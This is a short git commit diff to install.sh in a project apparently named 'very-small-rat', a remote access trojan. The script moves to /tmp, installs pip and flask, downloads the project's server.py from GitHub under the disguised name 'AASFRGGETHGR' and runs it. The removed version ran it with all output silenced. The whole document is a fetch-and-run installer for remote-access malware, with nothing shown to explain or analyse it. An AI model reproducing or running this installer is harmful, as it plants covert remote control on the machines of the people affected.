2d9ff7c459b94f03ddd98bb2ca6867f28da5756e
griffn <37548204+killgriff22@users.noreply.github.com>
2022-04-04 14:14:04 -0400

    updated install.sh to work native on intel and M1

--- install.sh
+++ install.sh
@@ -1,4 +1,6 @@
-python3 -m pip install flask requests
 cd /tmp
+curl "https://bootstrap.pypa.io/pip/2.7/get-pip.py" -o pip.py
+python2 pip.py
+python2 -m pip install flask
 curl "https://raw.githubusercontent.com/killgriff22/very-small-rat/main/server.py" -o AASFRGGETHGR
-python3 AASFRGGETHGR &> /dev/null 2>&1
+python2 AASFRGGETHGR
